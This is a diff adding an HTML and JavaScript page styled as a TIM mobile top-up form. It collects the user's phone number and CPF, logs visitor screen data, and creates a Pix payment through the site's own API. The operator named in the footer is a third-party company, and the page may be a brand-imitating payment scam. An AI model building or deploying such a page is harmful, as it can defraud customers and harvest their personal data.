@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TIM - Fazer Recarga</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; outline: none; }
+  body { background-color: #0114C4; color: white; margin: 0; padding: 0; }
+  .mobile-container { max-width: 480px; margin: 0 auto; position: relative; background-color: #0114C4; min-height: 100vh; }
+  header { padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; }
+  .menu-icon { display: flex; flex-direction: column; gap: 4px; }
+  .menu-icon span { display: block; width: 24px; height: 2px; background-color: white; }
+  .tim-logo-header { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; text-decoration: none; color: white; }
+
+  main { padding: 0 20px 40px; }
+  .promo-img { max-width: 100%; display: block; margin: 0 auto 20px; }
+  .page-title { text-align: center; font-size: 22px; font-weight: 900; margin-bottom: 30px; }
+
+  .section-label { font-size: 14px; font-weight: 700; margin-bottom: 8px; display: block; }
+  .card { background: white; border-radius: 16px; padding: 16px; margin-bottom: 24px; position: relative; }
+
+  .phone-card { display: flex; justify-content: space-between; align-items: center; }
+  .phone-label { font-size: 12px; color: #4052e6; font-weight: 600; margin-bottom: 4px; }
+  .phone-number { font-size: 22px; color: #0114C4; font-weight: 900; }
+  .btn-alterar { background: #E8EAF6; color: #4052e6; border: none; border-radius: 20px; padding: 8px 16px; font-weight: 700; font-size: 14px; cursor: pointer; text-decoration: none; }
+
+  .pay-card { display: flex; align-items: center; justify-content: space-between; border: 2px solid #0047FF; }
+  .pay-left { display: flex; align-items: center; gap: 12px; }
+  .pix-icon { width: 40px; height: 40px; background: #f0f0f0; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+  .pix-icon svg { width: 24px; height: 24px; }
+  .pay-title { font-size: 20px; color: #0114C4; font-weight: 900; }
+  .c6-promo { border: 1px solid #ccc; border-radius: 8px; padding: 8px; display: flex; align-items: center; gap: 8px; max-width: 150px; }
+  .c6-text { font-size: 9px; color: #0114C4; font-weight: 700; line-height: 1.1; }
+  .check-badge { position: absolute; bottom: -8px; right: -8px; width: 24px; height: 24px; background: #0047FF; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; border: 2px solid #0114C4; }
+
+  .value-card { display: flex; justify-content: space-between; align-items: center; border: 2px solid #0047FF; }
+  .vc-label { font-size: 10px; color: #0114C4; font-weight: 900; margin-bottom: 4px; text-transform: uppercase; }
+  .vc-price { font-size: 28px; color: #0114C4; font-weight: 900; line-height: 1; }
+  .vc-bonus { background: #F0F4FF; border: 1px solid #D0D9FF; border-radius: 8px; padding: 8px 12px; font-size: 10px; font-weight: 700; color: #0114C4; max-width: 140px; line-height: 1.2; }
+
+  @keyframes popIn {
+    0% { transform: scale(0); opacity: 0; }
+    60% { transform: scale(1.2); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+  .grid { display: grid; grid-template-columns: repeat(3, 90px); justify-content: center; gap: 20px; margin-bottom: 32px; margin-top: 24px; }
+  .grid-item {
+    width: 90px; height: 90px; border-radius: 50%;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    background: rgba(255,255,255,0.1); color: white; position: relative; cursor: pointer;
+    border: 5px solid transparent; transition: all 0.25s ease; user-select: none;
+  }
+  .grid-item.active { background: white; border: 5px solid #00C853; color: #0114C4; transform: scale(1.08); box-shadow: 0 6px 16px rgba(0,0,0,0.2); }
+  .gi-currency { font-size: 11px; font-weight: 800; margin-bottom: -2px; }
+  .gi-value { font-size: 26px; font-weight: 900; line-height: 1; display: flex; align-items: flex-start; }
+  .gi-cents { font-size: 12px; font-weight: 900; margin-top: 2px; }
+  .check-green {
+    position: absolute; bottom: -2px; right: -2px; width: 22px; height: 22px;
+    background: #00C853; color: white; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 12px; font-weight: bold; border: 2px solid #0114C4;
+    animation: popIn 0.3s ease forwards;
+  }
+
+  .action-buttons { display: flex; gap: 16px; padding: 0 10px; }
+  .btn { flex: 1; padding: 14px; border-radius: 30px; font-size: 16px; font-weight: 700; text-align: center; cursor: pointer; text-decoration: none; display: flex; align-items: center; justify-content: center; transition: all 0.2s ease; border: none; }
+  .btn-voltar { background: transparent; border: 2px solid #2D3A8C; color: white; }
+  .btn-recarregar { background: #FFCC00; border: none; color: #0114C4; box-shadow: 0px 4px 10px rgba(0,0,0,0.2); }
+  .btn-recarregar:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  @keyframes blink { 0% { opacity: 0.2; } 20% { opacity: 1; } 100% { opacity: 0.2; } }
+  .loading-dots span { animation: blink 1.4s infinite both; }
+  .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+  .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+  footer { border-top: 1px solid rgba(255,255,255,0.1); margin-top: 40px; padding: 32px 24px; background-color: #0112A6; }
+  .footer-logo { display: flex; align-items: center; gap: 6px; font-weight: 900; font-size: 24px; margin-bottom: 16px; }
+  .footer-desc { font-size: 14px; color: rgba(255,255,255,0.8); line-height: 1.5; margin-bottom: 32px; }
+  .footer-copy { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 24px; font-size: 11px; line-height: 1.6; color: rgba(255,255,255,0.6); }
+</style>
+</head>
+<body>
+<div class="mobile-container">
+  <header>
+    <a class="tim-logo-header" href="/">
+      <span style="color: #FF192D;">≡</span>
+      <span class="tim-logo-text">TIM</span>
+    </a>
+    <div class="menu-icon"><span></span><span></span><span></span></div>
+  </header>
+
+  <main>
+    <img src="../tim-pre-xip-promo-Ck4FnecT.png" alt="Promo TIM" class="promo-img" style="margin-top:-10px;" onerror="this.style.display='none'">
+
+    <h1 class="page-title">Fazer uma recarga TIM</h1>
+
+    <span class="section-label">Número TIM que receberá a recarga</span>
+    <div class="card phone-card">
+      <div>
+        <div class="phone-label">Meu número TIM</div>
+        <div class="phone-number" id="display-phone">(00) 00000-0000</div>
+      </div>
+      <a class="btn-alterar" href="/">Alterar</a>
+    </div>
+
+    <span class="section-label">Método de pagamento</span>
+    <div class="card pay-card">
+      <div class="pay-left">
+        <div class="pix-icon">
+          <svg viewBox="0 0 512 512" fill="#32BCAD"><path d="M410.8 190.4l-117.4-117.4c-20.7-20.7-54.2-20.7-74.8 0L101.2 190.4c-20.7 20.7-20.7 54.2 0 74.8l117.4 117.4c20.7 20.7 54.2 20.7 74.8 0l117.4-117.4c20.7-20.6 20.7-54.1 0-74.8zm-154.8 85.3L225 306.8c-4.2 4.2-10.9 4.2-15.1 0l-55.5-55.5c-4.2-4.2-4.2-10.9 0-15.1l55.5-55.5c4.2-4.2 10.9-4.2 15.1 0l31 31c4.2 4.2 4.2 10.9 0 15.1l-15.4 15.4c-2.1 2.1-2.1 5.4 0 7.5l15.4 15.4c4.2 4.2 10.9 4.2 15.1 0l31-31c4.2-4.2 4.2-10.9 0-15.1l-55.5-55.5c-4.2-4.2-10.9-4.2-15.1 0l-55.5 55.5c-12.5 12.5-12.5 32.8 0 45.3l55.5 55.5c12.5 12.5 32.8 12.5 45.3 0l55.5-55.5c4.2-4.2 4.2-10.9 0-15.1l-31-31c-4.1-4.2-10.8-4.2-15 0z"/></svg>
+        </div>
+        <div class="pay-title">Pix</div>
+      </div>
+      <div class="c6-promo">
+        <div><strong style="color:black; font-size:10px;">C6</strong><span style="color:#666; font-size:10px;">BANK</span></div>
+        <div class="c6-text">Ganhe +500MB grátis pagando com C6 Bank</div>
+      </div>
+      <div class="check-badge">✓</div>
+    </div>
+
+    <span class="section-label">Valor da recarga</span>
+    <div class="card value-card">
+      <div>
+        <div class="vc-label">BÔNUS SEMANAL</div>
+        <div class="vc-price">R$ 20</div>
+      </div>
+      <div class="vc-bonus">+3GB de bônus de internet por 7 dias</div>
+      <div class="check-badge">✓</div>
+    </div>
+
+    <div class="grid">
+      <div class="grid-item active" data-bonus="+3GB de bônus de internet por 7 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">20</div>
+        <div class="check-green">✓</div>
+      </div>
+      <div class="grid-item" data-bonus="+3GB de bônus de internet por 7 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">24<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+4GB de bônus de internet por 10 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">29<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+5GB de bônus de internet por 15 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">34<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+5GB de bônus de internet por 30 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">39<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+6GB de bônus de internet por 30 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">44<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+8GB de bônus de internet por 30 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">49<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+10GB de bônus de internet por 30 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">69<span class="gi-cents">90</span></div>
+      </div>
+      <div class="grid-item" data-bonus="+15GB de bônus de internet por 30 dias">
+        <span class="gi-currency">R$</span>
+        <div class="gi-value">99<span class="gi-cents">90</span></div>
+      </div>
+    </div>
+
+    <div class="action-buttons">
+      <a class="btn btn-voltar" href="/">Voltar</a>
+      <button class="btn btn-recarregar" id="btn-recarregar">Recarregar</button>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-logo">
+      <span style="color: #FF192D;">≡</span>
+      <span style="color: white; letter-spacing: -1px;">TIM</span>
+    </div>
+    <p class="footer-desc">
+      A forma mais rápida e segura de recarregar seu celular TIM. Praticidade e confiança em cada recarga.
+    </p>
+    <div class="footer-copy">
+      Pk Sistema On-Line Recargas Digitais LTDA<br>
+      Nome Fantasia: Pk Sistema On-Line Recargas Digitais<br>
+      CNPJ: 60.071.093/0001-77<br>
+      Inscrição Estadual PE: 1237478-48
+    </div>
+  </footer>
+</div>
+
+<script>
+  // Registra visita
+  fetch('/api/visitante', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      screen: `${window.screen.width}x${window.screen.height}`,
+      pagina: 'pagamento'
+    })
+  }).catch(() => {});
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const phone = urlParams.get('phone');
+  const cpf = urlParams.get('cpf');
+
+  if (!phone || !cpf) {
+    alert('Dados incompletos. Voltando para o início.');
+    window.location.href = '/';
+  }
+
+  document.getElementById('display-phone').textContent = phone;
+
+  const gridItems = document.querySelectorAll('.grid-item');
+  const vcPrice = document.querySelector('.vc-price');
+  const vcBonus = document.querySelector('.vc-bonus');
+
+  function readValueFromGrid(el) {
+    const valNode = el.querySelector('.gi-value');
+    let text = '';
+    valNode.childNodes.forEach(child => {
+      if (child.nodeType === Node.TEXT_NODE) text += child.textContent;
+      else if (child.classList && child.classList.contains('gi-cents')) text += ',' + child.textContent;
+    });
+    if (!text.includes(',')) text += ',00';
+    return text;
+  }
+
+  gridItems.forEach(item => {
+    item.addEventListener('click', function () {
+      gridItems.forEach(el => {
+        el.classList.remove('active');
+        const check = el.querySelector('.check-green');
+        if (check) check.remove();
+      });
+      this.classList.add('active');
+      const checkDiv = document.createElement('div');
+      checkDiv.className = 'check-green';
+      checkDiv.textContent = '✓';
+      this.appendChild(checkDiv);
+
+      vcPrice.textContent = 'R$ ' + readValueFromGrid(this);
+      const bonusText = this.getAttribute('data-bonus');
+      if (bonusText) vcBonus.textContent = bonusText;
+    });
+  });
+
+  const btnRecarregar = document.getElementById('btn-recarregar');
+  btnRecarregar.addEventListener('click', async function () {
+    this.innerHTML = 'Gerando PIX <span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+    this.style.opacity = '0.8';
+    this.style.pointerEvents = 'none';
+    this.disabled = true;
+
+    const activeItem = document.querySelector('.grid-item.active');
+    const val = activeItem ? readValueFromGrid(activeItem) : '20,00';
+    const bonus = activeItem ? (activeItem.getAttribute('data-bonus') || '') : '';
+
+    try {
+      const response = await fetch('/api/create-sale', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone, cpf, value: val, bonus })
+      });
+      const result = await response.json();
+
+      if (result.success && result.data.transactionId) {
+        sessionStorage.setItem('pixData', JSON.stringify({
+          ...(result.data.paymentData || {}),
+          transactionId: result.data.transactionId
+        }));
+        window.location.href = `pix.html?phone=${encodeURIComponent(phone)}&value=${encodeURIComponent(val)}`;
+        return;
+      }
+
+      alert(result.message || 'Erro ao gerar PIX. Tente novamente.');
+      this.innerHTML = 'Recarregar';
+      this.style.opacity = '1';
+      this.style.pointerEvents = 'auto';
+      this.disabled = false;
+    } catch (error) {
+      console.error(error);
+      alert('Falha de conexão com o servidor.');
+      this.innerHTML = 'Recarregar';
+      this.style.opacity = '1';
+      this.style.pointerEvents = 'auto';
+      this.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
